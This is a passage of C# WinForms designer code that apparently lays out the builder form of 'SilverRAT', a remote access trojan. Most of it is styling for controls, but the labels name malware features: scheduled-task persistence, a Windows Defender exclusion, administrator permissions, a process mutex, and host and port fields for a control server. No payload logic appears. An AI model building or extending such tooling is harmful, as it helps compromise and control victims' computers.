        this.BuilderCreateTask.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderCreateTask.Name = "BuilderCreateTask";
        this.BuilderCreateTask.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderCreateTask.OnCheck.BorderRadius = 6;
        this.BuilderCreateTask.OnCheck.BorderThickness = 2;
        this.BuilderCreateTask.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderCreateTask.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderCreateTask.OnCheck.CheckmarkThickness = 2;
        this.BuilderCreateTask.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderCreateTask.OnDisable.BorderRadius = 6;
        this.BuilderCreateTask.OnDisable.BorderThickness = 2;
        this.BuilderCreateTask.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderCreateTask.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderCreateTask.OnDisable.CheckmarkThickness = 2;
        this.BuilderCreateTask.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderCreateTask.OnHoverChecked.BorderRadius = 6;
        this.BuilderCreateTask.OnHoverChecked.BorderThickness = 2;
        this.BuilderCreateTask.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderCreateTask.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderCreateTask.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderCreateTask.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderCreateTask.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderCreateTask.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderCreateTask.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderCreateTask.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderCreateTask.OnUncheck.BorderRadius = 6;
        this.BuilderCreateTask.OnUncheck.BorderThickness = 1;
        this.BuilderCreateTask.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderCreateTask.Size = new System.Drawing.Size(21, 21);
        this.BuilderCreateTask.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderCreateTask.TabIndex = 610;
        this.BuilderCreateTask.ThreeState = false;
        this.BuilderCreateTask.ToolTipText = null;
        this.BuilderCreateTask.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.BuilderCreateTask_CheckedChanged);
        // 
        // TxTask
        // 
        this.TxTask.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxTask.AutoSize = true;
        this.TxTask.BackColor = System.Drawing.Color.Transparent;
        this.TxTask.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxTask.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxTask.ForeColor = System.Drawing.Color.Black;
        this.TxTask.Location = new System.Drawing.Point(62, 274);
        this.TxTask.Name = "TxTask";
        this.TxTask.Size = new System.Drawing.Size(132, 15);
        this.TxTask.TabIndex = 609;
        this.TxTask.Text = "Scheduled Task Support";
        // 
        // BuilderDefender
        // 
        this.BuilderDefender.AllowBindingControlAnimation = true;
        this.BuilderDefender.AllowBindingControlColorChanges = false;
        this.BuilderDefender.AllowBindingControlLocation = true;
        this.BuilderDefender.AllowCheckBoxAnimation = true;
        this.BuilderDefender.AllowCheckmarkAnimation = true;
        this.BuilderDefender.AllowOnHoverStates = true;
        this.BuilderDefender.AutoCheck = true;
        this.BuilderDefender.BackColor = System.Drawing.Color.Transparent;
        this.BuilderDefender.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderDefender.BackgroundImage")));
        this.BuilderDefender.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderDefender.BindingControl = this.TxWD;
        this.BuilderDefender.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderDefender.BorderRadius = 6;
        this.BuilderDefender.Checked = false;
        this.BuilderDefender.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderDefender.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderDefender.CustomCheckmarkImage = null;
        this.BuilderDefender.Location = new System.Drawing.Point(38, 345);
        this.BuilderDefender.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderDefender.Name = "BuilderDefender";
        this.BuilderDefender.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDefender.OnCheck.BorderRadius = 6;
        this.BuilderDefender.OnCheck.BorderThickness = 2;
        this.BuilderDefender.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDefender.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderDefender.OnCheck.CheckmarkThickness = 2;
        this.BuilderDefender.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderDefender.OnDisable.BorderRadius = 6;
        this.BuilderDefender.OnDisable.BorderThickness = 2;
        this.BuilderDefender.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderDefender.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderDefender.OnDisable.CheckmarkThickness = 2;
        this.BuilderDefender.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderDefender.OnHoverChecked.BorderRadius = 6;
        this.BuilderDefender.OnHoverChecked.BorderThickness = 2;
        this.BuilderDefender.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDefender.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderDefender.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderDefender.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderDefender.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderDefender.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderDefender.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderDefender.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderDefender.OnUncheck.BorderRadius = 6;
        this.BuilderDefender.OnUncheck.BorderThickness = 1;
        this.BuilderDefender.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderDefender.Size = new System.Drawing.Size(21, 21);
        this.BuilderDefender.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderDefender.TabIndex = 608;
        this.BuilderDefender.ThreeState = false;
        this.BuilderDefender.ToolTipText = null;
        // 
        // TxWD
        // 
        this.TxWD.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxWD.AutoSize = true;
        this.TxWD.BackColor = System.Drawing.Color.Transparent;
        this.TxWD.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxWD.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxWD.ForeColor = System.Drawing.Color.Black;
        this.TxWD.Location = new System.Drawing.Point(62, 349);
        this.TxWD.Name = "TxWD";
        this.TxWD.Size = new System.Drawing.Size(124, 15);
        this.TxWD.TabIndex = 607;
        this.TxWD.Text = "WD Exclusion Support";
        // 
        // bunifuCheckBox_0
        // 
        this.bunifuCheckBox_0.AllowBindingControlAnimation = true;
        this.bunifuCheckBox_0.AllowBindingControlColorChanges = false;
        this.bunifuCheckBox_0.AllowBindingControlLocation = true;
        this.bunifuCheckBox_0.AllowCheckBoxAnimation = true;
        this.bunifuCheckBox_0.AllowCheckmarkAnimation = true;
        this.bunifuCheckBox_0.AllowOnHoverStates = true;
        this.bunifuCheckBox_0.AutoCheck = true;
        this.bunifuCheckBox_0.BackColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuCheckBox_0.BackgroundImage")));
        this.bunifuCheckBox_0.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.bunifuCheckBox_0.BindingControl = this.TxUAC;
        this.bunifuCheckBox_0.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.bunifuCheckBox_0.BorderRadius = 6;
        this.bunifuCheckBox_0.Checked = false;
        this.bunifuCheckBox_0.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.bunifuCheckBox_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.bunifuCheckBox_0.CustomCheckmarkImage = null;
        this.bunifuCheckBox_0.Location = new System.Drawing.Point(38, 308);
        this.bunifuCheckBox_0.MinimumSize = new System.Drawing.Size(17, 17);
        this.bunifuCheckBox_0.Name = "bunifuCheckBox_0";
        this.bunifuCheckBox_0.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuCheckBox_0.OnCheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnCheck.BorderThickness = 2;
        this.bunifuCheckBox_0.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuCheckBox_0.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnCheck.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.BorderRadius = 6;
        this.bunifuCheckBox_0.OnDisable.BorderThickness = 2;
        this.bunifuCheckBox_0.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.bunifuCheckBox_0.OnHoverChecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverChecked.BorderThickness = 2;
        this.bunifuCheckBox_0.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderThickness = 1;
        this.bunifuCheckBox_0.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.bunifuCheckBox_0.OnUncheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnUncheck.BorderThickness = 1;
        this.bunifuCheckBox_0.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.Size = new System.Drawing.Size(21, 21);
        this.bunifuCheckBox_0.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.bunifuCheckBox_0.TabIndex = 606;
        this.bunifuCheckBox_0.ThreeState = false;
        this.bunifuCheckBox_0.ToolTipText = null;
        // 
        // TxUAC
        // 
        this.TxUAC.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxUAC.AutoSize = true;
        this.TxUAC.BackColor = System.Drawing.Color.Transparent;
        this.TxUAC.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxUAC.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxUAC.ForeColor = System.Drawing.Color.Black;
        this.TxUAC.Location = new System.Drawing.Point(62, 312);
        this.TxUAC.Name = "TxUAC";
        this.TxUAC.Size = new System.Drawing.Size(191, 15);
        this.TxUAC.TabIndex = 605;
        this.TxUAC.Text = "Administrator Permissions Support";
        // 
        // BuilderProcessMutex
        // 
        this.BuilderProcessMutex.AcceptsReturn = false;
        this.BuilderProcessMutex.AcceptsTab = false;
        this.BuilderProcessMutex.AnimationSpeed = 200;
        this.BuilderProcessMutex.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderProcessMutex.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderProcessMutex.AutoSizeHeight = true;
        this.BuilderProcessMutex.BackColor = System.Drawing.Color.Transparent;
        this.BuilderProcessMutex.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderProcessMutex.BackgroundImage")));
        this.BuilderProcessMutex.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderProcessMutex.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderProcessMutex.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderProcessMutex.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderProcessMutex.BorderRadius = 2;
        this.BuilderProcessMutex.BorderThickness = 1;
        this.BuilderProcessMutex.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderProcessMutex.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderProcessMutex.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderProcessMutex.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderProcessMutex.DefaultText = "";
        this.BuilderProcessMutex.FillColor = System.Drawing.Color.White;
        this.BuilderProcessMutex.HideSelection = true;
        this.BuilderProcessMutex.IconLeft = null;
        this.BuilderProcessMutex.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderProcessMutex.IconPadding = 4;
        this.BuilderProcessMutex.IconRight = global::SilverRAT.Properties.Resources.UpdateText;
        this.BuilderProcessMutex.IconRightCursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderProcessMutex.Lines = new string[0];
        this.BuilderProcessMutex.Location = new System.Drawing.Point(36, 169);
        this.BuilderProcessMutex.MaxLength = 32767;
        this.BuilderProcessMutex.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderProcessMutex.Modified = false;
        this.BuilderProcessMutex.Multiline = false;
        this.BuilderProcessMutex.Name = "BuilderProcessMutex";
        stateProperties85.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties85.FillColor = System.Drawing.Color.Empty;
        stateProperties85.ForeColor = System.Drawing.Color.Empty;
        stateProperties85.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderProcessMutex.OnActiveState = stateProperties85;
        stateProperties86.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties86.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties86.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties86.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderProcessMutex.OnDisabledState = stateProperties86;
        stateProperties87.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties87.FillColor = System.Drawing.Color.Empty;
        stateProperties87.ForeColor = System.Drawing.Color.Empty;
        stateProperties87.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderProcessMutex.OnHoverState = stateProperties87;
        stateProperties88.BorderColor = System.Drawing.Color.Silver;
        stateProperties88.FillColor = System.Drawing.Color.White;
        stateProperties88.ForeColor = System.Drawing.Color.Empty;
        stateProperties88.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderProcessMutex.OnIdleState = stateProperties88;
        this.BuilderProcessMutex.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderProcessMutex.PasswordChar = '\0';
        this.BuilderProcessMutex.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderProcessMutex.PlaceholderText = "Process Mutex";
        this.BuilderProcessMutex.ReadOnly = false;
        this.BuilderProcessMutex.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderProcessMutex.SelectedText = "";
        this.BuilderProcessMutex.SelectionLength = 0;
        this.BuilderProcessMutex.SelectionStart = 0;
        this.BuilderProcessMutex.ShortcutsEnabled = true;
        this.BuilderProcessMutex.Size = new System.Drawing.Size(284, 28);
        this.BuilderProcessMutex.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderProcessMutex.TabIndex = 603;
        this.BuilderProcessMutex.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderProcessMutex.TextMarginBottom = 0;
        this.BuilderProcessMutex.TextMarginLeft = 3;
        this.BuilderProcessMutex.TextMarginTop = 1;
        this.BuilderProcessMutex.TextPlaceholder = "Process Mutex";
        this.BuilderProcessMutex.UseSystemPasswordChar = false;
        this.BuilderProcessMutex.WordWrap = true;
        this.BuilderProcessMutex.OnIconRightClick += new System.EventHandler(this.BuilderProcessMutex_OnIconRightClick);
        // 
        // BuilderPort
        // 
        this.BuilderPort.AcceptsReturn = false;
        this.BuilderPort.AcceptsTab = false;
        this.BuilderPort.AnimationSpeed = 200;
        this.BuilderPort.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderPort.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderPort.AutoSizeHeight = true;
        this.BuilderPort.BackColor = System.Drawing.Color.Transparent;
        this.BuilderPort.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderPort.BackgroundImage")));
        this.BuilderPort.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderPort.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderPort.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderPort.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderPort.BorderRadius = 2;
        this.BuilderPort.BorderThickness = 1;
        this.BuilderPort.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderPort.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderPort.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderPort.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderPort.DefaultText = "6606";
        this.BuilderPort.FillColor = System.Drawing.Color.White;
        this.BuilderPort.HideSelection = true;
        this.BuilderPort.IconLeft = null;
        this.BuilderPort.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderPort.IconPadding = 10;
        this.BuilderPort.IconRight = null;
        this.BuilderPort.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderPort.Lines = new string[] {
        "6606"};
        this.BuilderPort.Location = new System.Drawing.Point(238, 135);
        this.BuilderPort.MaxLength = 32767;
        this.BuilderPort.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderPort.Modified = false;
        this.BuilderPort.Multiline = false;
        this.BuilderPort.Name = "BuilderPort";
        stateProperties89.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties89.FillColor = System.Drawing.Color.Empty;
        stateProperties89.ForeColor = System.Drawing.Color.Empty;
        stateProperties89.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderPort.OnActiveState = stateProperties89;
        stateProperties90.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties90.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties90.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties90.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderPort.OnDisabledState = stateProperties90;
        stateProperties91.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties91.FillColor = System.Drawing.Color.Empty;
        stateProperties91.ForeColor = System.Drawing.Color.Empty;
        stateProperties91.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderPort.OnHoverState = stateProperties91;
        stateProperties92.BorderColor = System.Drawing.Color.Silver;
        stateProperties92.FillColor = System.Drawing.Color.White;
        stateProperties92.ForeColor = System.Drawing.Color.Empty;
        stateProperties92.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderPort.OnIdleState = stateProperties92;
        this.BuilderPort.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderPort.PasswordChar = '\0';
        this.BuilderPort.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderPort.PlaceholderText = "Group";
        this.BuilderPort.ReadOnly = false;
        this.BuilderPort.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderPort.SelectedText = "";
        this.BuilderPort.SelectionLength = 0;
        this.BuilderPort.SelectionStart = 4;
        this.BuilderPort.ShortcutsEnabled = true;
        this.BuilderPort.Size = new System.Drawing.Size(82, 28);
        this.BuilderPort.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderPort.TabIndex = 602;
        this.BuilderPort.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderPort.TextMarginBottom = 0;
        this.BuilderPort.TextMarginLeft = 3;
        this.BuilderPort.TextMarginTop = 1;
        this.BuilderPort.TextPlaceholder = "Group";
        this.BuilderPort.UseSystemPasswordChar = false;
        this.BuilderPort.WordWrap = true;
        // 
        // BuilderHost
        // 
        this.BuilderHost.AcceptsReturn = false;
        this.BuilderHost.AcceptsTab = false;
        this.BuilderHost.AnimationSpeed = 200;
        this.BuilderHost.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderHost.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderHost.AutoSizeHeight = true;
        this.BuilderHost.BackColor = System.Drawing.Color.Transparent;
        this.BuilderHost.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderHost.BackgroundImage")));
        this.BuilderHost.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderHost.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderHost.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderHost.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderHost.BorderRadius = 2;
        this.BuilderHost.BorderThickness = 1;
        this.BuilderHost.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderHost.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderHost.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderHost.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderHost.DefaultText = "";
        this.BuilderHost.FillColor = System.Drawing.Color.White;
        this.BuilderHost.HideSelection = true;
        this.BuilderHost.IconLeft = null;
        this.BuilderHost.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderHost.IconPadding = 10;
        this.BuilderHost.IconRight = null;
        this.BuilderHost.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderHost.Lines = new string[0];
        this.BuilderHost.Location = new System.Drawing.Point(36, 135);
        this.BuilderHost.MaxLength = 32767;
        this.BuilderHost.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderHost.Modified = false;
        this.BuilderHost.Multiline = false;
        this.BuilderHost.Name = "BuilderHost";
        stateProperties93.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties93.FillColor = System.Drawing.Color.Empty;
        stateProperties93.ForeColor = System.Drawing.Color.Empty;
        stateProperties93.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderHost.OnActiveState = stateProperties93;
        stateProperties94.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties94.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties94.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties94.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderHost.OnDisabledState = stateProperties94;
        stateProperties95.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties95.FillColor = System.Drawing.Color.Empty;
        stateProperties95.ForeColor = System.Drawing.Color.Empty;
        stateProperties95.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderHost.OnHoverState = stateProperties95;
        stateProperties96.BorderColor = System.Drawing.Color.Silver;
        stateProperties96.FillColor = System.Drawing.Color.White;
        stateProperties96.ForeColor = System.Drawing.Color.Empty;
        stateProperties96.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderHost.OnIdleState = stateProperties96;
        this.BuilderHost.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderHost.PasswordChar = '\0';
        this.BuilderHost.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderHost.PlaceholderText = "Host";
        this.BuilderHost.ReadOnly = false;
        this.BuilderHost.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderHost.SelectedText = "";
        this.BuilderHost.SelectionLength = 0;
        this.BuilderHost.SelectionStart = 0;
        this.BuilderHost.ShortcutsEnabled = true;
        this.BuilderHost.Size = new System.Drawing.Size(196, 28);
        this.BuilderHost.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderHost.TabIndex = 601;
        this.BuilderHost.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderHost.TextMarginBottom = 0;
        this.BuilderHost.TextMarginLeft = 3;
        this.BuilderHost.TextMarginTop = 1;
        this.BuilderHost.TextPlaceholder = "Host";
        this.BuilderHost.UseSystemPasswordChar = false;
        this.BuilderHost.WordWrap = true;
        // 
        // BuilderGroup
        // 
        this.BuilderGroup.AcceptsReturn = false;
        this.BuilderGroup.AcceptsTab = false;
        this.BuilderGroup.AnimationSpeed = 200;
        this.BuilderGroup.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderGroup.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderGroup.AutoSizeHeight = true;
        this.BuilderGroup.BackColor = System.Drawing.Color.Transparent;
        this.BuilderGroup.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderGroup.BackgroundImage")));
        this.BuilderGroup.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderGroup.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderGroup.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderGroup.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderGroup.BorderRadius = 2;
        this.BuilderGroup.BorderThickness = 1;
        this.BuilderGroup.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderGroup.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderGroup.Cursor = System.Windows.Forms.Cursors.IBeam;
